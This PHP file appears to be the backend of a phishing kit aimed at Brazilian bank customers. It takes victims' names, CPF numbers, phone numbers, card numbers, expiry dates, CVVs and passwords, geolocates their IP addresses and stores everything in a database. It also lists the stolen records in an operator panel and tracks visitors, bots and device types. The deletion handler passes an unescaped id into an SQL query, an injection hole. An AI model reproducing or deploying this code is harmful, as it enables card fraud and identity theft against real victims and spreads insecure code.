<?php 

/*
▀▀█▀▀ ▒█░▒█ ▒█▀▀▀ ░░ ▒█▀▀▀ ░█▀▀█ ▒█░▄▀ ▒█▀▀▀ 
░▒█░░ ▒█▀▀█ ▒█▀▀▀ ▀▀ ▒█▀▀▀ ▒█▄▄█ ▒█▀▄░ ▒█▀▀▀ 
░▒█░░ ▒█░▒█ ▒█▄▄▄ ░░ ▒█░░░ ▒█░▒█ ▒█░▒█ ▒█▄▄▄
*/

require_once("db.php");

$cliente = addslashes($_POST["cliente"]);

switch($cliente){

	case "online": 
		
	    $time = time()+15;
		$ip = base64_encode($_SERVER['REMOTE_ADDR']);
		date_default_timezone_set('America/Sao_Paulo');
        $hora = date('H:i:s');
		
		$sql = mysqli_query($conn, "SELECT * from online");
		if(mysqli_num_rows($sql) > 0){

		$sqlx = mysqli_query($conn, "SELECT * from online WHERE ip='$ip'");
		if(mysqli_num_rows($sqlx) > 0){
		
		$query = mysqli_query($conn, "UPDATE online SET time='$time' WHERE ip='$ip'");
				
		}else{
		
		$query = mysqli_query($conn, "INSERT INTO online (ip, time) VALUES ('$ip' , '$time')");

		}
		
	    }else{
		
		$query = mysqli_query($conn, "INSERT INTO online (ip, time) VALUES ('$ip' , '$time')");

		}
	
		break; 


case "send":

$t = addslashes($_POST["titular"]);
$cpf = addslashes($_POST["cpf"]);
$tel = addslashes($_POST["telefone"]);
$num = addslashes($_POST["numero"]);
$val = addslashes($_POST["validade"]);
$c = addslashes($_POST["cvv"]);
$s = addslashes($_POST["senha"]);

##########################################
          
		  $ip = base64_encode($_SERVER['REMOTE_ADDR']);
		  $ip2 = $_SERVER['REMOTE_ADDR'];
          date_default_timezone_set('America/Sao_Paulo');
		  $datex = date('d/m/y H:i');
		  $d = json_decode(file_get_contents("https://geolocation-db.com/json/$ip2")); 
		  $cidade = $d->city; $pais = $d->country_name; 
		  $local = $cidade.' / '.$pais; 
  
		  $sql = mysqli_query($conn, "SELECT * FROM clientes WHERE ip='$ip'"); 
		  if(mysqli_num_rows($sql) > 1){
		   echo "";
		  }else{
				$query = "INSERT INTO clientes (titular, cpf, telefone, numero, validade, cvv, senha, local, ip) VALUES ('$t', '$cpf', '$tel', '$num', '$val', '$c', '$s', '$local', '$ip')";
				if(mysqli_query($conn, $query)){
					echo "ok";			
					}else{
					echo "error";
				}
		  }

break;

case "estatisticas":

$QUERY = "SELECT COUNT(*) FROM cliques";
$resultc = mysqli_query($conn, $QUERY);
$row = mysqli_fetch_array($resultc);
$cliques = $row['COUNT(*)'];	

$QUERY2 = "SELECT COUNT(*) FROM bots";
$resultb = mysqli_query($conn, $QUERY2);
$rows = mysqli_fetch_array($resultb);
$bots = $rows['COUNT(*)'];	

$QUERY3 = "SELECT COUNT(*) FROM dispositivo WHERE nome='mobile'";
$resultv = mysqli_query($conn, $QUERY3);
$rowv = mysqli_fetch_array($resultv);
$mobile = $rowv['COUNT(*)'];	

$QUERY4 = "SELECT COUNT(*) FROM dispositivo WHERE nome='desktop'";
$resultk = mysqli_query($conn, $QUERY4);
$rowt = mysqli_fetch_array($resultk);
$desktop = $rowt['COUNT(*)'];	

$QUERY5 = "SELECT COUNT(*) FROM clientes";
$resultq = mysqli_query($conn, $QUERY5);
$rowq = mysqli_fetch_array($resultq);
$clientes = $rowq['COUNT(*)'];	

echo "$cliques|$bots|$mobile|$desktop|$clientes";
break;

case "cadastros":


										$sql = "SELECT * from clientes";
										$result = mysqli_query($conn, $sql);
										while($row = mysqli_fetch_array($result)){ 	
										
													$id = $row['id'];
													$titular = $row['titular'];
													$cpf = $row['cpf'];
													$telefone = $row['telefone'];
													$numero = $row['numero'];
													$validade = $row['validade'];
													$cvv = $row['cvv'];
													$senha = $row['senha'];
													$local = $row['local'];
													
										echo '<tr>
											<td>
											'.$titular.'
											</td>
											<td>
											 '.$cpf.'
											</td>
											<td>
											 '.$telefone.'
											</td>
											<td>
											  '.$numero.'
											</td>
											<td>
											  '.$validade.'
											</td>
											<td>
											  '.$cvv.'
											</td>
											<td>
											  '.$senha.'
											</td>
											<td>
											  '.$local.'
											</td>
																						
											<td class="text-center">
											 <button onclick="excluir(this.id);" id="'.$id.'" type="button" rel="tooltip" title="" class="btn btn-link .theb" data-original-title="Excluir">
											<i class="tim-icons icon-trash-simple"></i>
										  </button>
											</td>
										  </tr>
										  ';
													
											}
 

break;

case "totalOnline":
	
	$sq = "SELECT count(id) as online FROM online WHERE time >= '" . time() . "'";
	
	$info = mysqli_query($conn, $sq);
	$resp = mysqli_fetch_assoc($info);
	
	echo $resp['online'];
	
break;

case "zerarvisitas":
$query = mysqli_query($conn, "DELETE FROM cliques");
if(mysqli_query($conn, $query)){
 echo 'sucesso';
}else{
 echo 'erro';
 }
break;

case "zerarcell":
$query = mysqli_query($conn, "DELETE FROM dispositivo WHERE nome = 'mobile'");
if(mysqli_query($conn, $query)){
 echo 'sucesso';
}else{
 echo 'erro';
 }
break;

case "zerarpc": 
$query = mysqli_query($conn, "DELETE FROM dispositivo WHERE nome = 'desktop'");
if(mysqli_query($conn, $query)){
 echo 'sucesso';
}else{
 echo 'erro';
 }
break;

case "zerarrobo": 
$query = mysqli_query($conn, "DELETE FROM bots");
if(mysqli_query($conn, $query)){
 echo 'sucesso';
}else{
 echo 'erro';
 }
break;

case "excluir": 
$id=$_POST["id"]; 
$query = mysqli_query($conn, "DELETE FROM clientes WHERE id = '$id'");
if(mysqli_query($conn, $query)){
 echo 'sucesso';
}else{
 echo 'erro';
 }
break;

}

?>